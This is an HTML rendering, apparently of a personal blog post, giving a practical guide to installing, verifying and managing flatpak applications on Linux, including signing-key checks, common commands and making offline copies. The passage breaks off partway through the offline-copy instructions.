+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/02/22/material-sync-circle-rsync/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    rsync
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../simple-snapcraft-snap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    snap
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../08/13/material-server-security-wazuh-all-your-things-with-tailscale/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wazuh all your things with Tailscale
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WiFiChallenge Exam &amp; Course Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../08/material-microsoft-windows-windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_30" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_30" id="__nav_3_30_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Archive
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_30_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_30">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Archive
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2024
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2023/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2023
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2022/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2022
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2019/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2019
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../../../" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2024-05-07 00:00:00+00:00" class="md-ellipsis">May 7, 2024</time>
+                      </div>
+                    </li>
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 13h1.5v2.82l2.44 1.41-.75 1.3L15 16.69zm4-5H5v11h4.67c-.43-.91-.67-1.93-.67-3a7 7 0 0 1 7-7c1.07 0 2.09.24 3 .67zM5 21a2 2 0 0 1-2-2V5c0-1.11.89-2 2-2h1V1h2v2h8V1h2v2h1a2 2 0 0 1 2 2v6.1c1.24 1.26 2 2.99 2 4.9a7 7 0 0 1-7 7c-1.91 0-3.64-.76-4.9-2zm11-9.85A4.85 4.85 0 0 0 11.15 16c0 2.68 2.17 4.85 4.85 4.85A4.85 4.85 0 0 0 20.85 16c0-2.68-2.17-4.85-4.85-4.85"/></svg>
+                          <time datetime="2025-06-15 00:00:00+00:00" class="md-ellipsis">June 15, 2025</time>
+                        </div>
+                      </li>
+                    
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              18 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+            
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setup">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#filesystem-locations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Filesystem Locations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#app-runtime-filesystem-layout-on-the-host" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        App / Runtime Filesystem Layout (on the host):
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#repositories" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Repositories
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Repositories">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#signing-keys-flathub" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SIgning Keys (Flathub):
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verifying-a-flatpak-application" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verifying a flatpak Application
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#general-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        General Commands
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Advanced Usage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#creating-applications-to-go" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Creating Applications To-Go
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Creating Applications To-Go">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#installing-the-local-offline-application" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Installing the Local / Offline Application
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flatpak-180-or-later" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flatpak 1.8.0 or later
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flatpak-prior-to-180" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flatpak prior to 1.8.0
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explore-an-application-sandbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Explore an Application Sandbox
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Explore an Application Sandbox">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#file-chooser-portal-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File-Chooser Portal / Database
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sandbox-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sandbox Overview
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Sandbox Overview">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sandbox-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sandbox Permissions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#d-bus-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        D-Bus Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#monitoring-d-bus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Monitoring D-Bus
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#portals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Portals
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-defined-permissions-flatpak-override" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Defined Permissions (flatpak override)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="User Defined Permissions (flatpak override)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#global-overrides" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Global Overrides
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#system-wide-overrides" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System-Wide Overrides:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-note-on-gvfs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A Note On gvfs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#application-level-overrides" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Application Level Overrides:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#runtimes-and-sandboxing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Runtimes and Sandboxing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-override-command" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Override Command
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#validating-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Validating Permissions
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+  
+  
+
+
+<h1 id="flatpak"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 0c-.556 0-1.111.144-1.61.432l-7.603 4.39a3.22 3.22 0 0 0-1.61 2.788v8.78c0 1.151.612 2.212 1.61 2.788l7.603 4.39a3.22 3.22 0 0 0 3.22 0l7.603-4.39a3.22 3.22 0 0 0 1.61-2.788V7.61a3.22 3.22 0 0 0-1.61-2.788L13.61.432A3.2 3.2 0 0 0 12 0m0 2.358c.15 0 .299.039.431.115l7.604 4.39c.132.077.24.187.315.316L12 12v9.642a.86.86 0 0 1-.431-.116l-7.604-4.39a.87.87 0 0 1-.431-.746V7.61c0-.153.041-.302.116-.43L12 12Z"/></svg></span> flatpak</h1>
+<p>An overview of using and configuring flatpak. Flatpak is a packaging system for unix-like machines, and also a security sandboxing system.</p>
+<!-- more -->
+
+<p><em>This file is originally from <a href="https://github.com/straysheep-dev/linux-configs/tree/main/flatpak">straysheep-dev/linux-configs</a>.</em></p>
+<h2 id="references">References</h2>
+<p>Full documentation:</p>
+<ul>
+<li><a href="https://docs.flatpak.org/en/latest/index.html">https://docs.flatpak.org/en/latest/index.html</a></li>
+</ul>
+<p>Read these first before jumping in:</p>
+<ul>
+<li>
+<p><a href="https://github.com/flatpak/flatpak/wiki/Sandbox">https://github.com/flatpak/flatpak/wiki/Sandbox</a></p>
+</li>
+<li>
+<p><a href="https://github.com/flatpak/flatpak/wiki/Metadata">https://github.com/flatpak/flatpak/wiki/Metadata</a></p>
+</li>
+<li>
+<p><a href="https://github.com/flatpak/flatpak/wiki/Filesystem">https://github.com/flatpak/flatpak/wiki/Filesystem</a></p>
+</li>
+<li>
+<p><a href="https://github.com/flatpak/flatpak/wiki/Portals">https://github.com/flatpak/flatpak/wiki/Portals</a></p>
+</li>
+<li>
+<p><a href="https://wiki.gnome.org/Design/Whiteboards/ApplicationSandboxing">https://wiki.gnome.org/Design/Whiteboards/ApplicationSandboxing</a></p>
+</li>
+<li>
+<p><a href="https://docs.flatpak.org/en/latest/conventions.html">https://docs.flatpak.org/en/latest/conventions.html</a></p>
+</li>
+</ul>
+<p>Flatpak documentation is licensed under the <code>CC-BY 4.0</code></p>
+<ul>
+<li><a href="https://github.com/flatpak/flatpak-docs/blob/master/COPYING">https://github.com/flatpak/flatpak-docs/blob/master/COPYING</a></li>
+</ul>
+<p>Examples adapted from stackexchange are also under the <code>CC-BY 4.0</code></p>
+<ul>
+<li>
+<p>See answer from user Ian here: <a href="https://unix.stackexchange.com/questions/404905/offline-install-of-a-flatpak-application">https://unix.stackexchange.com/questions/404905/offline-install-of-a-flatpak-application</a></p>
+</li>
+<li>
+<p><a href="https://stackoverflow.com/legal/terms-of-service#licensing">https://stackoverflow.com/legal/terms-of-service#licensing</a></p>
+</li>
+<li>
+<p><a href="https://creativecommons.org/licenses/by-sa/4.0/">https://creativecommons.org/licenses/by-sa/4.0/</a></p>
+</li>
+</ul>
+<p>Examples adapted from hacktricks use the <code>CC BY-NC 4.0</code> (non-commercial)</p>
+<ul>
+<li><a href="https://github.com/carlospolop/hacktricks/blob/master/LICENSE.md">https://github.com/carlospolop/hacktricks/blob/master/LICENSE.md</a></li>
+</ul>
+<hr />
+<h2 id="setup">Setup</h2>
+<p><a href="https://www.flatpak.org/setup/Ubuntu">https://www.flatpak.org/setup/Ubuntu</a></p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>flatpak
+
+<span class="c1"># Note: the Software Center app on Ubuntu 20.04 and later is distributed as a snap package, &#39;snap-store&#39;</span>
+
+<span class="c1"># This means following the next step and Installing gnome-software-plugin-flatpak will also install the deb</span>
+<span class="c1"># version of the Software Center &#39;gnome-software&#39; effectively a duplicate not confined by snap.</span>
+<span class="c1"># The &#39;snap-store&#39; does not currently support installing flatpaks via the GUI, so the CLI is used instead.</span>
+
+<span class="c1"># optional step:</span>
+sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>gnome-software-plugin-flatpak
+
+
+flatpak<span class="w"> </span>remote-add<span class="w"> </span>--if-not-exists<span class="w"> </span>flathub<span class="w"> </span>https://flathub.org/repo/flathub.flatpakrepo
+
+<span class="c1"># Also not a bad idea to add the collection ID to this remote for creating offline versions of installed apps for backup:</span>
+flatpak<span class="w"> </span>remote-modify<span class="w"> </span>--collection-id<span class="o">=</span>org.flathub.Stable<span class="w"> </span>flathub
+
+reboot
+</code></pre></div>
+<h3 id="filesystem-locations">Filesystem Locations</h3>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/var/lib/flatpak/*</code></td>
+<td>System install location for flatpak applications and runtimes</td>
+</tr>
+<tr>
+<td><code>/var/lib/flatpak/app/</code></td>
+<td>System-wide applications</td>
+</tr>
+<tr>
+<td><code>/var/lib/flatpak/runtime/</code></td>
+<td>System-wide runtimes</td>
+</tr>
+<tr>
+<td><code>/var/lib/flatpak/sideload-repos</code></td>
+<td>Persistent offline / local repo path (1.8.0 or later)</td>
+</tr>
+<tr>
+<td><code>~/.var/app/*</code></td>
+<td>User install location and cwd for flatpak configuration files</td>
+</tr>
+<tr>
+<td><code>/run/user/$UID/doc/*</code></td>
+<td>fusefs portal access from within the sandbox</td>
+</tr>
+<tr>
+<td><code>/run/flatpak/sideload-repos</code></td>
+<td>Ephemeral offline / local repo path  (1.8.0 or later)</td>
+</tr>
+<tr>
+<td><code>/usr/share/flatpak/portals/*</code></td>
+<td>Keys of user-granted portal permissions</td>
+</tr>
+</tbody>
+</table>
+<h3 id="app-runtime-filesystem-layout-on-the-host">App / Runtime Filesystem Layout (on the host):</h3>
+<p><code>/var/lib/flatpak/(app|runtime)/ID/ARCH/BRANCH</code></p>
+<h2 id="repositories">Repositories</h2>
+<p><a href="https://docs.flatpak.org/en/latest/repositories.html">https://docs.flatpak.org/en/latest/repositories.html</a></p>
+<h3 id="signing-keys-flathub">SIgning Keys (Flathub):</h3>
+<p>Keys are typically stored here:</p>
+<p><code>gpg /var/lib/flatpak/repo/flathub.trustedkeys.gpg</code>
+<div class="highlight"><pre><span></span><code>gpg: WARNING: no command supplied.  Trying to guess what you mean ...
+pub   rsa4096/0x4184DD4D907A7CAE 2017-06-16 [SC] [expires: 2027-06-14]
+      Key fingerprint = 6E5C 05D9 79C7 6DAF 93C0  8135 4184 DD4D 907A 7CAE
+uid                             Flathub Repo Signing Key &lt;flathub@flathub.org&gt;
+sub   rsa4096/0x562702E9E3ED7EE8 2017-06-16 [S] [expires: 2027-06-14]
+</code></pre></div></p>
+<p>You can obtain the remote repo data for use in an offline environemnt with:</p>
+<p><div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-LfO<span class="w"> </span>https://flathub.org/repo/flathub.flatpakrepo
+</code></pre></div>
+Extract key material for review with:</p>
+<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>GPG<span class="w"> </span>./org.example.app.flatpakref<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;=&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>gpg
+</code></pre></div>
+<p>You can do the same with individual applications as well, to manually check the signatures and see what key they were signed with.</p>
+<p>To obtain the <code>.flatpakref</code> for an application which contains it's information and signature, follow a similar process to obtaining the signatures for setting up offline / local remotes:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-LfO<span class="w"> </span><span class="s1">&#39;https://flathub.org/repo/appstream/org.example.app.flatpakref&#39;</span>
+</code></pre></div>
+<p>You can then read the key data with:</p>
+<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>GPG<span class="w"> </span>./org.example.app.flatpakref<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;=&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>gpg
+</code></pre></div>
+<h3 id="verifying-a-flatpak-application">Verifying a flatpak Application</h3>
+<p>While flatpaks exist within a security sandbox, it's still a good idea to verify you're installing the intended application from the correct developer.</p>
+<p><a href="https://docs.flatpak.org/en/latest/using-flatpak.html#identifiers">https://docs.flatpak.org/en/latest/using-flatpak.html#identifiers</a></p>
+<blockquote>
+<p>Flatpak identifies each application and runtime using a unique three-part identifier, such as <code>com.company.App</code>. The final segment of this address is the object’s name, and the preceding part identifies the developer, so that the same developer can have multiple applications, like <code>com.company.App1</code> and <code>com.company.App2</code>.</p>
+</blockquote>
+<p><a href="https://docs.flatpak.org/en/latest/conventions.html#application-ids">https://docs.flatpak.org/en/latest/conventions.html#application-ids</a></p>
+<p><a href="https://github.com/flathub/flathub/wiki/App-Requirements#application-id">https://github.com/flathub/flathub/wiki/App-Requirements#application-id</a></p>
+<blockquote>
+<p>As described in Using Flatpak, Flatpak requires each application to have a unique identifier, which has a form such as <code>org.gnome.Dictionary</code>.</p>
+<p>The format is in reverse-DNS style so the first section is generally a domain controlled by the project and the trailing section represents the specific project. There are some exceptions to this, such as extensions using the base application-id of the project they extend rather than their own.</p>
+<p>As will be seen below and in future sections, this ID is expected to be used in a number of places. Developers must follow the standard D-Bus naming conventions for bus names when creating their own IDs. This format is already recommended by the Desktop File specification and Appstream specification also.</p>
+</blockquote>
+<p>The above seems to indicate that extensions can use an existing application ID, but may <strong>not necessarily be maintained by the same developer</strong>.</p>
+<p>Ways you can verify you have the correct flatpak:</p>
+<ul>
+<li>Check the developer's documentation on how and where to obtain the application, it should point to an official flatpak.</li>
+<li>Check the flatpak id, it's often formatted as <code>tld.developer.application</code></li>
+<li>On the application's flathub page <code>https://flathub.org/apps/details/&lt;tld.developer.application&gt;</code> go to Publisher, then <code>See details</code>, confirm the developer is a contributer.</li>
+<li>Alternatively, browser to <code>https://github.com/flathub/&lt;tld.developer.application&gt;</code> and review the contributers.</li>
+</ul>
+<h2 id="general-commands">General Commands</h2>
+<p><a href="https://docs.flatpak.org/en/latest/using-flatpak.html">https://docs.flatpak.org/en/latest/using-flatpak.html</a></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># find applications</span>
+flatpak<span class="w"> </span>search<span class="w"> </span>gimp
+
+<span class="c1"># show info about remote applications</span>
+flatpak<span class="w"> </span>remote-info<span class="w"> </span>flathub<span class="w"> </span>org.gnome.Recipes
+
+<span class="c1"># obtain a log of all previous versions of the application</span>
+flatpak<span class="w"> </span>remote-info<span class="w"> </span>--log<span class="w"> </span>flathub<span class="w"> </span>org.gnome.Recipes
+
+<span class="c1"># downgrade or install a previous version</span>
+sudo<span class="w"> </span>flatpak<span class="w"> </span>update<span class="w"> </span>--commit<span class="o">=</span>ec07ad6c54e803d1428e5580426a41315e50a14376af033458e7a65bfb2b64f0<span class="w"> </span>org.gnome.Recipes
+
+<span class="c1"># update an application to the latest version</span>
+sudo<span class="w"> </span>flatpak<span class="w"> </span>update<span class="w"> </span>org.gnome.Recipes
+
+<span class="c1"># update all applications and runtimes</span>
+sudo<span class="w"> </span>flatpak<span class="w"> </span>update
+
+<span class="c1"># install an applicaiton</span>
+flatpak<span class="w"> </span>install<span class="w"> </span>gimp
+
+<span class="c1"># show installed flatpak data</span>
+flatpak<span class="w"> </span>list
+
+<span class="c1"># show information on an installed pacakge</span>
+flatpak<span class="w"> </span>info<span class="w"> </span>gimp
+
+<span class="c1"># pin a package to a version (prevent updates)</span>
+flatpak<span class="w"> </span>mask<span class="w"> </span>org.gnome.Recipes
+
+<span class="c1"># run an application</span>
+flatpak<span class="w"> </span>run<span class="w"> </span>org.gimp.GIMP
+
+<span class="c1"># inspect running apps</span>
+flatpak<span class="w"> </span>ps
+
+<span class="c1"># terminate a process</span>
+flatpak<span class="w"> </span><span class="nb">kill</span><span class="w"> </span>&lt;application-id&gt;
+
+<span class="c1"># show a table of all permissions granted via portals to the application(s)</span>
+flatpak<span class="w"> </span>permissions
+</code></pre></div>
+<h2 id="advanced-usage">Advanced Usage</h2>
+<p>Configuring resource limits for apps</p>
+<p><a href="https://docs.flatpak.org/en/latest/tips-and-tricks.html#configuring-resource-limits-for-apps">https://docs.flatpak.org/en/latest/tips-and-tricks.html#configuring-resource-limits-for-apps</a></p>
+<p>When systemd is available, Flatpak tries to put app processes in a scope such</p>
+<p>as <code>app-com.brave.Browser-*.scope</code> (in the case of Brave), with <code>*</code> replaced by</p>
+<p>an arbitrary suffix. This means you can create a file like</p>
+<p><code>~/.config/systemd/user/app-flatpak-com.brave.Browser-.scope.d/memory.conf</code></p>
+<p>with contents like::</p>
+<div class="highlight"><pre><span></span><code>  [Scope]
+  MemoryHigh=1G
+</code></pre></div>
+<p>Then after a <code>systemctl --user daemon-reload</code>, those</p>
+<p><code>systemd.resource-control(5)</code> parameters will apply to all instances of that</p>
+<p>app.</p>
+<hr />
+<h2 id="creating-applications-to-go">Creating Applications To-Go</h2>
+<p>Create offline / local copies of applications as backups or specific versions or to install on offline machines.</p>
+<p><strong>Summary</strong></p>
+<ol>
+<li>
+<p><code>flatpak install flathub org.example.app</code></p>
+</li>
+<li>
+<p><code>flatpak create-usb . org.example.app</code> <strong>NOTE</strong>: you may also need to do this for all required runtimes</p>
+<p>3.1 place the <code>.ostree</code> directory into a mounted folder and run <code>flatpak install flathub org.example.app</code>
+or
+3.2 run <code>flatpak install --sideload-repo=/path/to/.ostree/repo flathub org.example.app</code></p>
+</li>
+<li>
+<p><a href="https://docs.flatpak.org/en/latest/usb-drives.html">https://docs.flatpak.org/en/latest/usb-drives.html</a></p>
+</li>
+<li>
+<p><a href="https://blogs.gnome.org/mclasen/2018/08/26/about-flatpak-installations/">https://blogs.gnome.org/mclasen/2018/08/26/about-flatpak-installations/</a></p>
+</li>
+<li>
+<p><a href="https://github.com/flatpak/flatpak-docs/commit/5febc66828e485a3632e97b78030aad433544896">https://github.com/flatpak/flatpak-docs/commit/5febc66828e485a3632e97b78030aad433544896</a></p>
+</li>
+<li>
+<p><a href="https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=usb#flatpak">https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=usb#flatpak</a></p>
+</li>
+<li>
+<p><a href="https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=usb#flatpak-create-usb">https://docs.flatpak.org/en/latest/flatpak-command-reference.html?highlight=usb#flatpak-create-usb</a></p>
+</li>
+<li>
+<p><a href="https://unix.stackexchange.com/questions/404905/offline-install-of-a-flatpak-application">https://unix.stackexchange.com/questions/404905/offline-install-of-a-flatpak-application</a></p>
+</li>
+</ol>
+<p>If you're familiar with <code>snap</code> packages, this effectively gives you the <code>.snap</code> and <code>.assert</code> equivalent, the app, runtimes, and valid gpg signatures. With flatpak, it's in the form of a local repository, meaning a directory of the application with all of the necessary data to install it offline.</p>
+<p>To create, or essentially download a flatpak application either to have as an offline backup, a specific version, or to transfer to an airgapped machine, there are two ways to do this which depend on which <code>flatpak --version</code> you're running.</p>
+<p>This is ideal for running tests on various versions of an application without burning a large amount of data uninstalling then redownloading, both for yourself and for the flatpak remote server you're pulling from.</p>
+<p>This example uses the following:</p>
+<ul>
+<li>flathub as the remote repo.</li>
+<li>org.gnome.Recipes as the application</li>
+</ul>
+<hr />
+<p>First install the target application (you need to install it to create the offline / local version), then gather and configure, the following information:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># obtain the full application id, which is in the next step is &#39;org.gnome.Recipes&#39;</span>
+flatpak<span class="w"> </span>list<span class="w"> </span>--app
+<span class="c1"># obtain the name of the remote repo</span>
+flatpak<span class="w"> </span>info<span class="w"> </span>-o<span class="w"> </span>org.gnome.Recipes
+<span class="c1"># using the name obtained in the previous step, check the Collection ID field of the remote repo:</span>
+flatpak<span class="w"> </span>remotes<span class="w"> </span>-d
+
